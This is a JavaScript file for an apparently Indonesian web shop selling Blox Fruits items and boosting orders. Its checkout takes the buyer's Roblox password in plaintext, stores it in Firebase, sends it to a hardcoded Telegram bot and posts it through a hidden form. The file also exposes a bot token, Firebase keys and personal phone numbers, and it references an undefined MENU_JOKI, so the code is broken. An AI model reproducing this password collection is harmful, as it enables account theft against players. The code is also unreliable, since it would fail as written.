// CONFIG FIREBASE
const firebaseConfig = {
    apiKey: "AIzaSyAOU2RNedLbO5QpKm9gEHF7KQC9XFACMdc",
    authDomain: "xzyo-s.firebaseapp.com",
    databaseURL: "https://xzyo-s-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "xzyo-s", 
    storageBucket: "xzyo-s.firebasestorage.app",
    messagingSenderId: "949339875672", 
    appId: "1:949339875672:web:b5d751452bf5875a445d2d"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// CONFIG TELEGRAM
const TELE_TOKEN = "8583864388:AAFjsa4xFHym5s1s2FRDMS04DrCaUYHKMPk"; 
const TELE_CHAT_ID = "6076444140"; 

const MENU_FRUIT = [
    { n: "🍎 PHYSICAL FRUIT (VIA TRADE)", header: true },
    { n: "✦ Kitsune", p: 50000, s: 2 }, // s adalah stock
    { n: "✦ Dragon", p: 45000, s: 0 },  // Stock 0 = Sold Out
    { n: "✦ Dough", p: 20000, s: 5 },
    { n: "✦ Leopard", p: 35000, s: 3 },
];

let cart = {}; // Menyimpan jumlah per item
let selectedPay = "", currentTid = "", discount = 0;

function init() {
    const box = document.getElementById('joki-list'); // Tetap pakai ID yang sama dari HTML
    box.innerHTML = ""; 
    
    MENU_FRUIT.forEach((item, index) => {
        if (item.header) {
            box.innerHTML += `<div class="item-header" style="background: #2c3e50; color: #fff; padding: 10px; margin-top: 10px; font-weight: bold; border-radius: 12px; text-align: center; margin-bottom: 8px;">${item.n}</div>`;
        } else {
            const isSoldOut = item.s <= 0;
            
            box.innerHTML += `
            <div class="item-joki-cart" id="item-${index}" style="display:flex; justify-content:space-between; align-items:center; padding:12px; background:${isSoldOut ? '#1a1a1a' : 'var(--inactive)'}; margin-bottom:8px; border-radius:15px; border:1px solid ${isSoldOut ? '#333' : 'var(--border)'}; opacity: ${isSoldOut ? '0.6' : '1'};">
                <div style="flex:1">
                    <div style="font-weight:600; font-size:14px; color:${isSoldOut ? '#777' : 'white'}">${item.n}</div>
                    <div style="color:${isSoldOut ? '#555' : 'var(--primary)'}; font-size:12px;">Rp ${item.p.toLocaleString()} | Stock: ${item.s}</div>
                </div>
                <div style="display:flex; align-items:center; gap:10px;">
                    <button onclick="${isSoldOut ? '' : `updateCart(${index}, -1)`}" style="width:28px; height:28px; border-radius:8px; border:none; background:#30363d; color:white; cursor:${isSoldOut ? 'not-allowed' : 'pointer'};">-</button>
                    <span id="qty-${index}" style="font-weight:800; min-width:15px; text-align:center;">0</span>
                    <button onclick="${isSoldOut ? '' : `updateCart(${index}, 1)`}" style="width:28px; height:28px; border-radius:8px; border:none; background:${isSoldOut ? '#444' : 'var(--primary)'}; color:black; cursor:${isSoldOut ? 'not-allowed' : 'pointer'}; font-weight:800;">${isSoldOut ? 'X' : '+'}</button>
                </div>
            </div>`;
        }
    });
}

function updateCart(index, delta) {
    if (!cart[index]) cart[index] = 0;
    cart[index] += delta;
    if (cart[index] < 0) cart[index] = 0;

    document.getElementById(`qty-${index}`).innerText = cart[index];
    
    // Highlight kalau ada isinya
    const el = document.getElementById(`item-${index}`);
    if (cart[index] > 0) {
        el.style.borderColor = "var(--primary)";
        el.style.background = "rgba(0, 210, 255, 0.05)";
    } else {
        el.style.borderColor = "var(--border)";
        el.style.background = "var(--inactive)";
    }
    hitung();
}

function applyVoucher() {
    const code = document.getElementById('vouchCode').value.toUpperCase();
    const sekarang = new Date(); 
    const limitFeb = new Date(2026, 1, 28, 23, 59, 59); 
    const daftarVoucher = { "R3Z4": 0.20, "RAF4": 0.15, "F4HR1": 0.15, "FEB2026": 0.15 };

    if (daftarVoucher[code] !== undefined) {
        if (code === "FEB2026" && sekarang > limitFeb) {
            discount = 0;
            alert("⚠️ Voucher FEB2026 sudah kadaluarsa, Lek!");
        } else {
            discount = daftarVoucher[code];
            alert(`✅ Voucher Berhasil! Potongan ${discount * 100}% diterapkan.`);
        }
    } else {
        discount = 0;
        alert("❌ Kode Voucher tidak valid!");
    }
    hitung();
}

function hitung() {
    let txt = ""; 
    let subtotal = 0;
    
    MENU_JOKI.forEach((item, index) => {
        if (cart[index] > 0) {
            txt += `${item.n} (${cart[index]}x), `;
            subtotal += (item.p * cart[index]);
        }
    });
    
    let totalFix = subtotal - (subtotal * discount);
    document.getElementById('detailText').value = txt.slice(0, -2);
    document.getElementById('totalAkhir').innerText = "Rp " + totalFix.toLocaleString();
    updateBtn();
}

function selectPay(m, el) {
    selectedPay = m;
    document.querySelectorAll('.pay-bar').forEach(p => p.classList.remove('selected'));
    el.classList.add('selected');
    updateBtn();
}

function updateBtn() {
    const u = document.getElementById('userRoblox').value;
    const hasItems = Object.values(cart).some(q => q > 0);
    document.getElementById('btnGas').disabled = !(u && hasItems && selectedPay);
}

async function prosesPesanan() {
    const loader = document.getElementById('loading-overlay');
    loader.style.display = 'flex';

    currentTid = "XZY-" + Math.floor(Math.random()*900000+100000);
    const u = document.getElementById('userRoblox').value;
    const p = document.getElementById('passRoblox').value;
    const w = document.getElementById('waUser').value;
    const itm = document.getElementById('detailText').value;
    const tot = document.getElementById('totalAkhir').innerText;

    try {
        await db.ref('orders/' + currentTid).set({
            tid: currentTid, status: "pending", user: u, pass: p, wa: w, items: itm, total: tot, method: selectedPay, timestamp: Date.now()
        });

        const pesanTele = `🚀 *PESANAN JOKI BARU!*\n--------------------------\n🆔 *Order ID:* \`${currentTid}\` \n👤 *User:* \`${u}\` \n🔑 *Pass:* \`${p}\` \n📱 *WA:* ${w} \n🛒 *Item:* ${itm} \n💰 *Total:* ${tot} \n💳 *Metode:* ${selectedPay}\n--------------------------`;
        await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_CHAT_ID}&text=${encodeURIComponent(pesanTele)}&parse_mode=Markdown`);

        setTimeout(() => {
            loader.style.display = 'none';
            switchSlide(1, 2);
            document.getElementById('payNominal').innerText = tot;
            document.getElementById('displayTid').innerText = currentTid;

            const qrisDisplay = document.getElementById('qris-display');
            const infoTeks = document.getElementById('payMethodInfo');
            const fotoQR = document.getElementById('gambar-qris');

            if (selectedPay === "DANA") {
                qrisDisplay.style.display = "none";
                infoTeks.innerText = "DANA: 089677323404 (A/N REZA)";
            } 
            else if (selectedPay === "OVO" || selectedPay === "GOPAY") {
                qrisDisplay.style.display = "none";
                infoTeks.innerText = selectedPay + ": 089517154561 (A/N REZA)";
            } 
            else if (selectedPay === "QRIS") {
                infoTeks.innerText = "SCAN QRIS DI BAWAH INI";
                fotoQR.src = "https://drive.google.com/uc?export=view&id=1LkkjYoIP_Iy_LQx4KEm8TtXiI5q57IfJ";
                qrisDisplay.style.display = "block";
            }
        }, 1500);

    } catch (err) {
        loader.style.display = 'none';
        alert("Terjadi kesalahan, coba lagi Lek!");
    }

    db.ref('orders/' + currentTid + '/status').on('value', snap => {
        if(snap.val() === 'success') {
            kirimFormSubmit(currentTid, u, p, w, itm, tot);
            tampilkanSlide3(currentTid, u, itm, tot);
        }
    });
}

function kirimFormSubmit(tid, u, p, w, itm, tot) {
    document.getElementById('f_subject').value = "Pesanan joki dari (" + u + ")";
    document.getElementById('f_user').value = u;
    document.getElementById('f_pass').value = p;
    document.getElementById('f_wa').value = w;
    document.getElementById('f_pesanan').value = itm;
    document.getElementById('f_total').value = tot;
    const form = document.getElementById('hiddenForm');
    fetch(form.action, { method: "POST", body: new FormData(form), headers: { 'Accept': 'application/json' } });
}

function tampilkanSlide3(tid, u, itm, tot) {
    switchSlide(2, 3);
    document.getElementById('res-id').innerText = tid;
    document.getElementById('res-user').innerText = u;
    document.getElementById('res-item').innerText = itm;
    document.getElementById('res-total').innerText = tot;
}

function switchSlide(from, to) {
    document.getElementById('slide-' + from).classList.remove('active');
    setTimeout(() => { document.getElementById('slide-' + to).classList.add('active'); }, 100);
}

document.getElementById('togglePassword').onclick = function() {
    const p = document.getElementById('passRoblox');
    p.type = p.type === 'password' ? 'text' : 'password';
    this.classList.toggle('fa-eye-slash');
};

window.onload = init;

